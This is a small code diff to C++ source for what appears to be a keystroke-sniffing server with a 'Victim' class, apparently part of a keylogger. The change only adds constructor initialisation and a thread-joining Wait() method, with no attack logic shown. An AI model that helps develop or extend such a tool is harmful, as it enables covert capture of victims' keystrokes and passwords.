@@ -29,6 +29,7 @@ struct sockaddr_in Victim::Addr() const
 }
 
 KeySniffingServer::KeySniffingServer(std::string const &ip, int port)
+    : stop_(false), thrRecv_(NULL)
 {
     int sockfd;
     struct sockaddr_in addr;
@@ -68,6 +69,11 @@ void KeySniffingServer::Start()
 void KeySniffingServer::Stop()
 {
     stop_ = true;
+    thrRecv_->join();
+}
+
+void KeySniffingServer::Wait()
+{
     thrRecv_->join();
 }
 
